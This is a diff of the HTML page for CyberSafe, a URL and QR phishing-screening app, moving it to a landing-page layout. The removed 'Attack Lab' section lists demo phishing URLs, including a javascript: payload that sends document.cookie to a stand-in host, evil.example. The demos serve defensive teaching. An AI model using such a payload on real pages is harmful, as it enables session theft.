@@ -27,9 +27,15 @@
       <div class="brand">
         <i data-lucide="shield-check" class="brand-icon"></i>
         <span>CyberSafe</span>
-        <div class="badge">OFFLINE ENGINE</div>
       </div>
       <div class="nav-links">
+        <a href="#" class="nav-link active" data-nav="home">Home</a>
+        <a href="#" class="nav-link" data-nav="analyze">Analyze</a>
+        <a href="#" class="nav-link" data-nav="qr">QR Scanner</a>
+        <a href="#" class="nav-link" data-nav="reports">Reports</a>
+        <a href="#" class="nav-link" data-nav="history">History</a>
+        <a href="#" class="nav-link" data-nav="attack-lab">Attack Lab</a>
+        <a href="#" class="nav-link" data-nav="threat-intel">Threat Intel</a>
         <a href="https://cybersafebackend.onrender.com/docs" target="_blank" rel="noopener noreferrer" class="nav-link" title="API Docs">
           <i data-lucide="book-open"></i>
         </a>
@@ -37,271 +43,395 @@
     </div>
   </nav>
 
-  <!-- Hero Section -->
-  <header class="hero">
-    <div class="container hero-container">
-      <h1 class="hero-title">
-        See the destination.<br>
-        <span class="text-gradient">Understand the risk.</span> Stay safe.
-      </h1>
-      <!-- Phase 7: Accurate hero subtitle -->
-      <p class="hero-subtitle">
-        Deterministic, explainable URL & QR risk screening. No destination requests are made during analysis.
-      </p>
-      <!-- Phase 7: SAFE ANALYSIS MODE badge -->
-      <div class="safe-mode-banner">
-        <div class="safe-mode-items">
-          <span class="safe-mode-item"><i data-lucide="shield-off"></i> No destination requests</span>
-          <span class="safe-mode-item"><i data-lucide="eye-off"></i> No URL fetching</span>
-          <span class="safe-mode-item"><i data-lucide="wifi-off"></i> No DNS resolution</span>
-          <span class="safe-mode-item"><i data-lucide="lock"></i> Analyzes structure only</span>
-        </div>
-      </div>
-    </div>
-  </header>
+  <main class="main-wrapper">
 
-  <main class="container main-content">
+    <!-- ============================================================
+         SECTION 1 — HERO
+         ============================================================ -->
+    <header class="hero">
+      <div class="container hero-container">
+        <h1 class="hero-title">
+          See the destination.<br>
+          <span class="text-gradient">Understand the risk.</span> Stay safe.
+        </h1>
+        <p class="hero-subtitle">
+          Analyze suspicious URLs and QR codes before you trust them.
+        </p>
 
-    <!-- Analyzer Flow -->
-    <section class="analyzer-section">
-      <!-- Input Card -->
-      <div class="glass-card input-card">
-        <div class="card-header">
-          <h2><i data-lucide="link"></i> Analyze Link or Payload</h2>
-        </div>
-        <form id="analyze-form" class="analyze-form">
-          <div class="input-group">
-            <input
-              type="text"
-              id="url-input"
-              class="url-input"
-              placeholder="Paste suspicious URL, phishing link, or payload..."
-              autocomplete="off"
-              spellcheck="false"
-              required>
-            <button type="submit" id="analyze-btn" class="btn btn-primary" title="Screen URL">
-              <i data-lucide="search"></i> <span>Analyze</span>
-            </button>
-            <button type="button" id="qr-toggle-btn" class="btn btn-secondary" title="Scan QR Code">
-              <i data-lucide="qr-code"></i> <span>Scan QR</span>
-            </button>
-          </div>
-          <div class="security-notice">
-            <i data-lucide="info"></i>
-            <span>CyberSafe analyzes the URL structure without visiting the destination. No data is sent to the target.</span>
-          </div>
-        </form>
-
-        <!-- QR Scanner Area (Hidden by default) -->
-        <div id="qr-reader-container" class="qr-container hidden">
-          <div class="qr-header">
-            <h3>QR Code Scanner</h3>
-            <button type="button" id="qr-close-btn" class="btn-icon"><i data-lucide="x"></i></button>
-          </div>
-          <div id="qr-reader"></div>
-          <p class="qr-help">Position the QR code within the frame, or upload an image.</p>
-        </div>
-      </div>
-
-      <!-- State Displays -->
-      <!-- Phase 3: Loading text now says "Analyzing URL structure..." -->
-      <div id="loading-state" class="state-container hidden">
-        <div class="scanline-loader"></div>
-        <p id="loading-text">Analyzing URL structure...</p>
-      </div>
-
-      <!-- Phase 16: Professional error states -->
-      <div id="error-state" class="state-container error-container hidden">
-        <i data-lucide="alert-triangle" class="error-icon"></i>
-        <h3 id="error-title">Analysis Failed</h3>
-        <p id="error-message">Could not complete the request.</p>
-        <div class="error-actions">
-          <button class="btn btn-secondary" onclick="document.getElementById('error-state').classList.add('hidden')">
-            Dismiss
-          </button>
-        </div>
-      </div>
-
-      <!-- Results Container -->
-      <div id="results-container" class="results-container hidden">
-        <!-- Verdict Banner -->
-        <div class="verdict-banner" id="verdict-banner">
-          <div class="verdict-main">
-            <div class="verdict-icon" id="verdict-icon"></div>
-            <div class="verdict-details">
-              <h2 id="verdict-title">VERDICT</h2>
-              <p id="verdict-recommendation">Recommendation goes here.</p>
-            </div>
-          </div>
-          <div class="verdict-metrics">
-            <div class="metric-box">
-              <span class="metric-label">Security Rating</span>
-              <span class="metric-value font-mono" id="score-text">0/100</span>
-            </div>
-            <div class="metric-box">
-              <span class="metric-label">Confidence</span>
-              <span class="metric-value" id="confidence-text">HIGH</span>
-            </div>
-          </div>
-        </div>
-
-        <!-- Offline Analysis Results -->
-        <div id="offline-results">
-
-          <!-- Risk score breakdown -->
-          <div class="glass-card risk-score-card">
-            <div class="card-header">
-              <h3><i data-lucide="bar-chart-2"></i> Risk Score Breakdown</h3>
-              <!-- Phase 12: Export report button -->
-              <button id="export-report-btn" class="btn-text hidden" title="Copy security report to clipboard">
-                <i data-lucide="clipboard-copy"></i> Copy Report
+        <!-- Primary CTA with inline URL input -->
+        <div class="hero-cta">
+          <form id="hero-analyze-form" class="hero-analyze-form">
+            <div class="hero-input-group">
+              <input
+                type="text"
+                id="hero-url-input"
+                class="hero-url-input"
+                placeholder="Paste a suspicious URL..."
+                autocomplete="off"
+                spellcheck="false"
+                required>
+              <button type="submit" class="btn btn-primary btn-lg" title="Analyze URL">
+                <i data-lucide="search"></i> <span>Analyze URL</span>
               </button>
             </div>
-            <div id="risk-score-breakdown"></div>
+            <button type="button" id="hero-qr-btn" class="btn btn-secondary btn-lg" title="Scan QR Code">
+              <i data-lucide="qr-code"></i> <span>Scan QR</span>
+            </button>
+          </form>
+          <p class="hero-note">No destination requests are made. Analysis runs locally on URL structure.</p>
+        </div>
+
+        <!-- Trust strip -->
+        <div class="trust-strip" role="img" aria-label="Analysis engines">
+          <div class="trust-item">
+            <i data-lucide="shield" aria-hidden="true"></i>
+            <span>Local Security Rules</span>
           </div>
-
-          <div class="analysis-grid">
-            <!-- URL Anatomy with visual breakdown -->
-            <div class="glass-card anatomy-card">
-              <div class="card-header">
-                <h3><i data-lucide="microscope"></i> URL Anatomy</h3>
-              </div>
-              <!-- Visual URL decomposition -->
-              <div id="anatomy-visual" class="anatomy-visual"></div>
-              <div class="anatomy-grid" id="anatomy-grid"></div>
-            </div>
-
-            <!-- Explainable findings -->
-            <div class="glass-card findings-card">
-              <div class="card-header">
-                <h3><i data-lucide="shield-alert"></i> Detection Rules</h3>
-                <span class="findings-count" id="findings-count">0 triggered</span>
-              </div>
-              <div class="findings-list" id="findings-list"></div>
-            </div>
+          <div class="trust-item">
+            <i data-lucide="activity" aria-hidden="true"></i>
+            <span>VirusTotal</span>
           </div>
-
-          <!-- Safe Analysis Mode explanation -->
-          <div class="glass-card safe-analysis-card" style="margin-top:1.5rem">
-            <div class="card-header">
-              <h3><i data-lucide="shield-check"></i> SAFE ANALYSIS MODE</h3>
-              <span class="safe-mode-label">Active</span>
-            </div>
-            <div class="safe-analysis-grid">
-              <div class="safe-analysis-item">
-                <i data-lucide="check-circle"></i>
-                <div>
-                  <strong>No destination requests</strong>
-                  <p>CyberSafe never fetches, visits, or pings the submitted URL.</p>
-                </div>
-              </div>
-              <div class="safe-analysis-item">
-                <i data-lucide="check-circle"></i>
-                <div>
-                  <strong>Structural analysis only</strong>
-                  <p>The URL string itself is parsed and checked against detection rules.</p>
-                </div>
-              </div>
-              <div class="safe-analysis-item">
-                <i data-lucide="info"></i>
-                <div>
-                  <strong>SAFE ≠ safe destination</strong>
-                  <p>No structural red flags were found. It does not guarantee the linked content is safe.</p>
-                </div>
-              </div>
-              <div class="safe-analysis-item">
-                <i data-lucide="check-circle"></i>
-                <div>
-                  <strong>No data exfiltration</strong>
-                  <p>Your submitted URL is sent only to the CyberSafe analysis API — never to the target.</p>
-                </div>
-              </div>
-            </div>
+          <div class="trust-item">
+            <i data-lucide="bot" aria-hidden="true"></i>
+            <span>Groq</span>
           </div>
-        </div>
-
-      </div><!-- /results-container -->
-
-      <!-- Phase 9: Attack Lab Section -->
-      <section class="attack-lab-section glass-card" style="margin-top:2rem">
-        <div class="card-header">
-          <h3><i data-lucide="zap"></i> Attack Lab</h3>
-          <span class="attack-lab-badge">Interactive Demos</span>
-        </div>
-        <p class="attack-lab-desc">Click any technique to instantly analyze a real-world example. None of these URLs are visited — only their structure is analyzed.</p>
-        <div class="attack-lab-grid attack-lab-demos">
-          <button class="attack-lab-btn" data-url="https://google.com@evil-phish.net/login" data-type="suspicious">
-            <div class="attack-lab-icon">🎭</div>
-            <div class="attack-lab-info">
-              <strong>Credential @ Trick</strong>
-              <span>Hides real destination after @</span>
-            </div>
-          </button>
-          <button class="attack-lab-btn demo-btn" data-url="https://paypa1-secure.verify.net/account" data-type="suspicious">
-            <div class="attack-lab-icon">🎯</div>
-            <div class="attack-lab-info">
-              <strong>Brand Lookalike</strong>
-              <span>Substituted characters in brand name</span>
-            </div>
-          </button>
-          <button class="attack-lab-btn demo-btn" data-url="javascript:fetch('https://evil.example/steal?c='+document.cookie)" data-type="suspicious">
-            <div class="attack-lab-icon">💉</div>
-            <div class="attack-lab-info">
-              <strong>Script Injection</strong>
-              <span>javascript: scheme payload</span>
-            </div>
-          </button>
-          <button class="attack-lab-btn demo-btn" data-url="https://xn--pple-43d.com/login" data-type="suspicious">
-            <div class="attack-lab-icon">🔤</div>
-            <div class="attack-lab-info">
-              <strong>Punycode Homograph</strong>
-              <span>Unicode lookalike characters</span>
-            </div>
-          </button>
-          <button class="attack-lab-btn demo-btn" data-url="https://tinyurl.com/y7d3xk9p" data-type="review">
-            <div class="attack-lab-icon">🔗</div>
-            <div class="attack-lab-info">
-              <strong>URL Shortener</strong>
-              <span>Hides destination via redirect</span>
-            </div>
-          </button>
-          <button class="attack-lab-btn demo-btn" data-url="http://10.0.0.1/admin/config.php" data-type="review">
-            <div class="attack-lab-icon">🌐</div>
-            <div class="attack-lab-info">
-              <strong>Internal IP Access</strong>
-              <span>Targeting private network range</span>
-            </div>
-          </button>
-        </div>
-      </section>
-
-    </section>
-
-    <!-- Sidebar / History -->
-    <aside class="sidebar">
-      <div class="glass-card history-card">
-        <div class="card-header">
-          <h3><i data-lucide="history"></i> Recent Scans</h3>
-          <button id="clear-history-btn" class="btn-text" title="Clear History">Clear</button>
-        </div>
-        <!-- Phase 11: History search -->
-        <div class="history-search-wrap">
-          <input type="text" id="history-search" class="history-search" placeholder="Filter history..." autocomplete="off">
-        </div>
-        <div id="history-list" class="history-list">
-          <div class="empty-history" id="empty-history">
-            <p>No recent scans. Locally stored.</p>
+          <div class="trust-item">
+            <i data-lucide="sparkles" aria-hidden="true"></i>
+            <span>Gemini</span>
           </div>
-          <!-- History items dynamically injected -->
         </div>
       </div>
-    </aside>
+    </header>
+
+    <!-- ============================================================
+         SECTION 3 — HOW CYBERSAFE ANALYZES
+         ============================================================ -->
+    <section class="section process-section">
+      <div class="container">
+        <header class="section-header">
+          <h2>How CyberSafe Analyzes</h2>
+          <p>Every URL passes through deterministic layers before an AI explanation is generated.</p>
+        </header>
+
+        <div class="process-flow">
+          <div class="process-step">
+            <div class="step-number">1</div>
+            <div class="step-content">
+              <h3>URL Input</h3>
+              <p>You paste a URL or scan a QR code. Nothing is fetched from the destination.</p>
+            </div>
+          </div>
+          <div class="step-arrow" aria-hidden="true"><i data-lucide="chevron-right"></i></div>
+
+          <div class="process-step">
+            <div class="step-number">2</div>
+            <div class="step-content">
+              <h3>URL Anatomy</h3>
+              <p>Scheme, hostname, path, query, user-information, port, encoding, and punycode are extracted.</p>
+            </div>
+          </div>
+          <div class="step-arrow" aria-hidden="true"><i data-lucide="chevron-right"></i></div>
+
+          <div class="process-step">
+            <div class="step-number">3</div>
+            <div class="step-content">
+              <h3>Security Rules</h3>
+              <p>Deterministic rules detect deceptive @, lookalike domains, dangerous schemes, IP hosts, shorteners, and suspicious paths.</p>
+            </div>
+          </div>
+          <div class="step-arrow" aria-hidden="true"><i data-lucide="chevron-right"></i></div>
+
+          <div class="process-step">
+            <div class="step-number">4</div>
+            <div class="step-content">
+              <h3>VirusTotal</h3>
+              <p>Reputation from 90+ security vendors. Community scores, passive DNS, and historical resolutions.</p>
+            </div>
+          </div>
+          <div class="step-arrow" aria-hidden="true"><i data-lucide="chevron-right"></i></div>
+
+          <div class="process-step">
+            <div class="step-number">5</div>
+            <div class="step-content">
+              <h3>Groq + Gemini</h3>
+              <p>AI reasoning explains findings in plain language. AI explains the verdict; it never overrides the deterministic score.</p>
+            </div>
+          </div>
+          <div class="step-arrow" aria-hidden="true"><i data-lucide="chevron-right"></i></div>
+
+          <div class="process-step">
+            <div class="step-number">6</div>
+            <div class="step-content">
+              <h3>Explainable Verdict</h3>
+              <p>Security Rating, confidence, findings, evidence, recommendation — all traceable to specific rules.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 4 — REALISTIC ANALYSIS PREVIEW
+         ============================================================ -->
+    <section class="section preview-section">
+      <div class="container">
+        <header class="section-header">
+          <h2>What a CyberSafe Result Looks Like</h2>
+          <p class="example-badge">Example result — static demo data</p>
+        </header>
+
+        <div class="preview-grid">
+          <!-- Left: Result card -->
+          <div class="preview-result">
+            <div class="glass-card preview-verdict REVIEW">
+              <div class="preview-verdict-header">
+                <div class="preview-verdict-main">
+                  <div class="preview-verdict-icon">
+                    <i data-lucide="alert-circle"></i>
+                  </div>
+                  <div>
+                    <h3 class="preview-verdict-title">REVIEW</h3>
+                    <p class="preview-verdict-desc">Proceed with caution</p>
+                  </div>
+                </div>
+                <div class="preview-verdict-metrics">
+                  <div class="metric-box">
+                    <span class="metric-label">Security Rating</span>
+                    <span class="metric-value font-mono">45/100</span>
+                  </div>
+                  <div class="metric-box">
+                    <span class="metric-label">Confidence</span>
+                    <span class="metric-value">MEDIUM</span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="preview-findings">
+                <h4>Detection Findings</h4>
+                <div class="preview-finding">
+                  <span class="preview-finding-icon" style="color: var(--review-text);">⚠️</span>
+                  <div>
+                    <strong>Suspicious Login Path</strong>
+                    <span>/verify-account detected</span>
+                  </div>
+                </div>
+                <div class="preview-finding">
+                  <span class="preview-finding-icon" style="color: var(--review-text);">⚠️</span>
+                  <div>
+                    <strong>Brand-like Hostname</strong>
+                    <span>paypa1-security.example mimics PayPal</span>
+                  </div>
+                </div>
+                <div class="preview-finding">
+                  <span class="preview-finding-icon" style="color: var(--safe-text);">✅</span>
+                  <div>
+                    <strong>HTTPS Enabled</strong>
+                    <span>Transport encryption present</span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="preview-url-anatomy">
+                <h4>URL Anatomy</h4>
+                <div class="preview-anatomy-row">
+                  <span class="anatomy-label">Scheme</span>
+                  <span class="anatomy-value font-mono">https</span>
+                </div>
+                <div class="preview-anatomy-row">
+                  <span class="anatomy-label">Hostname</span>
+                  <span class="anatomy-value font-mono">paypa1-security.example</span>
+                </div>
+                <div class="preview-anatomy-row">
+                  <span class="anatomy-label">Path</span>
+                  <span class="anatomy-value font-mono">/verify-account</span>
+                </div>
+                <div class="preview-anatomy-row">
+                  <span class="anatomy-label">Query</span>
+                  <span class="anatomy-value font-mono">redirect=paypal.com</span>
+                </div>
+              </div>
+
+              <div class="preview-recommendation">
+                <strong>Recommended Action:</strong> Verify the destination independently before proceeding. Do not enter credentials.
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: Why it matters -->
+          <div class="preview-explanation">
+            <div class="glass-card">
+              <h4>Why This Matters</h4>
+              <div class="explanation-item">
+                <i data-lucide="alert-triangle" style="color: var(--review-text);"></i>
+                <div>
+                  <strong>The hostname mimics a trusted brand.</strong>
+                  <p>The domain <code>paypa1-security.example</code> substitutes "1" for "l" in "paypal" — a classic lookalike technique. The actual destination is not PayPal.</p>
+                </div>
+              </div>
+              <div class="explanation-item">
+                <i data-lucide="alert-triangle" style="color: var(--review-text);"></i>
+                <div>
+                  <strong>The path signals credential harvesting.</strong>
+                  <p>Paths like <code>/verify-account</code>, <code>/login</code>, <code>/confirm</code> are commonly used in phishing pages to collect credentials.</p>
+                </div>
+              </div>
+              <div class="explanation-item">
+                <i data-lucide="check-circle" style="color: var(--safe-text);"></i>
+                <div>
+                  <strong>HTTPS is present but not proof of legitimacy.</strong>
+                  <p>Transport encryption protects data in transit, but does not verify the identity of the destination. Phishing sites routinely use valid TLS certificates.</p>
+                </div>
+              </div>
+
+              <div class="explanation-action">
+                <strong>Recommended Action:</strong>
+                <p>Do not enter credentials. Navigate directly to the official site by typing the URL yourself. Report the link if received via email or message.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 5 — CYBERSAFE TOOLS
+         ============================================================ -->
+    <section class="section tools-section">
+      <div class="container">
+        <header class="section-header">
+          <h2>CyberSafe Tools</h2>
+          <p>Every tool uses the same deterministic engine and explainable AI pipeline.</p>
+        </header>
+
+        <div class="tools-grid">
+          <a href="#" class="tool-card" data-nav="analyze">
+            <div class="tool-icon"><i data-lucide="search"></i></div>
+            <h3>URL Scanner</h3>
+            <p>Analyze any URL or payload. Get Security Rating, findings, VirusTotal, and AI explanation.</p>
+          </a>
+          <a href="#" class="tool-card" data-nav="qr">
+            <div class="tool-icon"><i data-lucide="qr-code"></i></div>
+            <h3>QR Scanner</h3>
+            <p>Scan QR codes from camera or image. Classify payload type and analyze embedded URLs.</p>
+          </a>
+          <a href="#" class="tool-card" data-nav="reports">
+            <div class="tool-icon"><i data-lucide="file-text"></i></div>
+            <h3>Reports</h3>
+            <p>Export security analysis as text report. Share findings with team or save for records.</p>
+          </a>
+          <a href="#" class="tool-card" data-nav="history">
+            <div class="tool-icon"><i data-lucide="history"></i></div>
+            <h3>History</h3>
+            <p>Review past scans. Filter by verdict, search by URL, revisit previous analyses.</p>
+          </a>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 6 — PRIVACY / SAFETY
+         ============================================================ -->
+    <section class="section privacy-section">
+      <div class="container">
+        <header class="section-header">
+          <h2>Privacy & Safety by Design</h2>
+          <p>CyberSafe is built on principles that protect you, not track you.</p>
+        </header>
+
+        <div class="privacy-grid">
+          <div class="privacy-item">
+            <i data-lucide="lock" aria-hidden="true"></i>
+            <h4>No Destination Requests</h4>
+            <p>Suspicious URLs are never automatically opened, fetched, or pinged. Analysis runs on structure only.</p>
+          </div>
+          <div class="privacy-item">
+            <i data-lucide="shield" aria-hidden="true"></i>
+            <h4>Deterministic Authority</h4>
+            <p>CyberSafe security rules are authoritative. AI explains findings but never overrides the deterministic verdict.</p>
+          </div>
+          <div class="privacy-item">
+            <i data-lucide="server" aria-hidden="true"></i>
+            <h4>Secrets Stay Server-Side</h4>
+            <p>VirusTotal, Groq, and Gemini API keys never leave the backend. Frontend receives only normalized results.</p>
+          </div>
+          <div class="privacy-item">
+            <i data-lucide="user" aria-hidden="true"></i>
+            <h4>Local History</h4>
+            <p>Scan history is stored locally in your browser. No accounts, no tracking, no cloud sync unless you opt in.</p>
+          </div>
+          <div class="privacy-item">
+            <i data-lucide="eye-off" aria-hidden="true"></i>
+            <h4>No Content Inspection</h4>
+            <p>CyberSafe does not fetch page content, execute JavaScript, follow redirects, or inspect cookies.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 7 — FINAL CTA
+         ============================================================ -->
+    <section class="section cta-section">
+      <div class="container">
+        <div class="cta-card glass-card">
+          <h2>Have a suspicious link?</h2>
+          <p>Paste it here and get an explainable Security Rating in seconds.</p>
+          <form id="footer-analyze-form" class="footer-analyze-form">
+            <div class="cta-input-group">
+              <input
+                type="text"
+                id="footer-url-input"
+                class="cta-url-input"
+                placeholder="Paste a suspicious URL..."
+                autocomplete="off"
+                spellcheck="false"
+                required>
+              <button type="submit" class="btn btn-primary btn-lg">
+                <i data-lucide="search"></i> <span>Analyze a URL</span>
+              </button>
+            </div>
+          </form>
+          <p class="cta-note">No destination requests. Analysis runs on URL structure only.</p>
+        </div>
+      </div>
+    </section>
 
   </main>
 
+  <!-- ============================================================
+       FOOTER
+       ============================================================ -->
   <footer class="footer">
-    <div class="container text-center text-muted">
-      <p>&copy; 2026 CyberSafe. All telemetry is pseudonymized and stored securely.</p>
+    <div class="container footer-grid">
+      <div class="footer-brand">
+        <div class="brand">
+          <i data-lucide="shield-check" class="brand-icon"></i>
+          <span>CyberSafe</span>
+        </div>
+        <p>Explainable URL & QR risk screening. Deterministic rules + explainable AI.</p>
+      </div>
+      <nav class="footer-nav">
+        <div class="footer-nav-col">
+          <h5>Product</h5>
+          <a href="#" data-nav="analyze">Analyze</a>
+          <a href="#" data-nav="qr">QR Scanner</a>
+          <a href="#" data-nav="reports">Reports</a>
+          <a href="#" data-nav="history">History</a>
+        </div>
+        <div class="footer-nav-col">
+          <h5>Intelligence</h5>
+          <a href="#" data-nav="attack-lab">Attack Lab</a>
+          <a href="#" data-nav="threat-intel">Threat Intel</a>
+        </div>
+        <div class="footer-nav-col">
+          <h5>Resources</h5>
+          <a href="https://cybersafebackend.onrender.com/docs" target="_blank" rel="noopener noreferrer">API Docs</a>
+        </div>
+      </nav>
+      <div class="footer-legal">
+        <p>&copy; 2026 CyberSafe. All telemetry is pseudonymized and stored securely.</p>
+        <p class="privacy-links"><a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Security</a></p>
+      </div>
     </div>
   </footer>
 
